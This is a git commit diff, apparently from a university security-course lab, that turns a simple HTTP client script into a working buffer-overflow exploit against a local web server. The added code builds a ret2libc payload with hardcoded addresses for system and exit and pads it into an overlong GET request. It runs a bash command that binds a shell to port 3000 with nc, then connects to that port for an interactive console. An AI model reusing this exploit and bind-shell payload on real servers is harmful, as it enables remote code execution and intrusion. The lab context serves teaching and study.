8fc2642b5bb675ea5cb38313c433614180ebbfb9
Soroush Karami <skarami@bertvm.cs.uic.edu>
2017-11-13 17:05:02 -0600

    first exploit (fixed.py)

--- fixed.py
+++ fixed.py
@@ -1,7 +1,9 @@
 #!/usr/bin/env python
-
+from struct import pack
 import sys
 import socket
+import time
+from console import console
 
 if len(sys.argv) != 3:
     sys.exit("Usage: %s PORT LISTEN_PORT" % sys.argv[0])
@@ -11,11 +13,26 @@ sock = socket.create_connection(('127.0.0.1', port),
                                 socket.getdefaulttimeout(),
                                 ('127.0.0.1', 0))
 
-sock.sendall("GET /index.html HTTP/1.0\r\n\r\n")
+p = ''
+#p += pack('<I', 0xb7e54310)
 
-while True:
-    buf = sock.recv(1024)
-    if not buf:
-        break
-    sys.stdout.write(buf)
-sock.close()
+p += pack('<I', 0xf7e59080) #system
+p += pack('<I', 0x08048bb4) #exit
+p += pack('<I', 0xffffcc10) #cmd
+p += pack('<I', 0xffffc850)
+p += pack('<I', 0xffffc850)
+p += ' '*90
+p += "bash -c 'coproc p { /bin/bash 2>&1; }; nc -l 127.0.0.1 3000 <&${p[0]} >&${p[1]}'    "
+
+sock.sendall("GET /"+" "+'w'*119+p+"\r\n\r\n")
+#sock.sendall("GET /aaa"+" "+'a'*95+"abcdefghijklmnopqrstuvwx"+c+"34567890"+p+p+"abcdefgh\r\n\r\n")
+
+#sock.close()
+time.sleep(2)
+print "connecting ..."
+port = int(sys.argv[2])
+sock = socket.create_connection(('127.0.0.1', 3000),
+                                socket.getdefaulttimeout(),
+                                ('127.0.0.1', 0))
+print "connected"
+console(sock)
